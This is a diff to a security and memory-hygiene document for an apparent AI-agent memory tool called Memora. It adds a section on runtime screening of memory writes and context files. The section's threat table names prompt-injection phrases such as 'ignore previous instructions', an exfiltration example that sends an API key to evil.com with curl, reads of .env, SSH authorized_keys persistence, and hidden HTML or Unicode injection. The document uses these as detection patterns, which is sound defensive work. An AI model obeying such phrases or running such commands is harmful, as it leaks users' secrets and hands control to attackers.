@@ -3,9 +3,9 @@
 **Purpose:** Explain Memora’s approach to memory hygiene, privacy awareness, and safe operating practices.  
 **Audience:** Users, maintainers, security-conscious teams.  
 **Read when:** You want to understand how Memora helps keep project memory clean and safe.  
-**Last updated:** 2026-04-03
+**Last updated:** 2026-04-16
 
-**See also:** [Patterns](./PATTERNS.md) · [Validation](./VALIDATION.md) · [Manifesto](./MANIFESTO.md) · [INDEX.md](./INDEX.md)
+**See also:** [Patterns](./PATTERNS.md) · [Validation](./VALIDATION.md) · [Runtime Layer](./RUNTIME.md) · [Manifesto](./MANIFESTO.md) · [INDEX.md](./INDEX.md)
 
 ---
 
@@ -15,6 +15,7 @@
 - [What should never be stored](#-what-should-never-be-stored)
 - [Why memory hygiene matters](#-why-memory-hygiene-matters)
 - [Practical safeguards already included](#-practical-safeguards-already-included)
+- [Runtime security screening](#-runtime-security-screening)
 - [Provider guardrail enforcement](#-provider-guardrail-enforcement)
 - [Privacy zones](#-privacy-zones)
 - [Safe operating practices](#-safe-operating-practices)
@@ -89,6 +90,44 @@ The repository includes maintenance workflows and deterministic advisory hooks t
 
 ### 5. Ignore-oriented local setup
 The initialization flow helps reinforce that local and sensitive session-state should stay separate from stable memory.
+
+---
+
+## 🔒 Runtime security screening
+
+Memora includes a **programmatic security layer** (`lib/runtime/`) that enforces at code level the rules described in this document.
+
+The runtime layer provides two screening functions:
+
+### Memory write screening (`checkMemoryWrite`)
+
+Before any content is persisted to a memory file, it is scanned for:
+
+| Category | Examples |
+|---|---|
+| Prompt injection | "ignore previous instructions", "you are now", "disregard your guidelines" |
+| Exfiltration | `curl https://evil.com?k=$API_KEY`, `wget ... $TOKEN`, `cat .env` |
+| SSH persistence | `authorized_keys` references, `~/.ssh` paths |
+| Invisible Unicode | Zero-width spaces (U+200B), directional overrides (U+202E), BOM (U+FEFF) |
+
+Memory files are prompt-adjacent: they are injected into the system prompt on future sessions. Blocking dangerous content here prevents injection and exfiltration payloads from persisting across sessions.
+
+### Context file screening (`loadContextFile`)
+
+Before a context file (`AGENTS.md`, `CLAUDE.md`, `.hermes.md`, `.cursorrules`, etc.) is injected into the prompt, it is scanned for:
+
+- All memory write threats (above), plus:
+- HTML comment injection (`<!-- ... override ... -->`)
+- Hidden `<div>` content injection (`display:none`)
+- Translate-and-execute patterns
+
+If a threat is detected, the function returns a **safe `[BLOCKED: ...]` placeholder** instead of the original content. The caller can inject the placeholder — the agent sees a clear block notice rather than silently missing context.
+
+### When screening is applied
+
+The runtime layer does not intercept file writes automatically. It is an **opt-in gate** — memory-restore, update-memory, and agent code must call `runtime.checkMemoryWrite()` and `runtime.loadContextFile()` explicitly.
+
+See [Runtime Layer](./RUNTIME.md) for the full API reference and threat pattern catalog.
 
 ---
 
@@ -190,11 +229,14 @@ Use this checklist when maintaining a project memory-bank:
 - [ ] durable files contain only stable, shareable knowledge
 - [ ] privacy-sensitive material follows project safety guidance
 - [ ] validation and maintenance workflows are used regularly
+- [ ] memory writes pass through `runtime.checkMemoryWrite()` before persistence
+- [ ] context files pass through `runtime.loadContextFile()` before injection
 
 ---
 
 ## 📚 Related reading
 
+- [Runtime Layer](./RUNTIME.md)
 - [Patterns](./PATTERNS.md)
 - [Validation](./VALIDATION.md)
 - [Workflows](./WORKFLOWS.md)
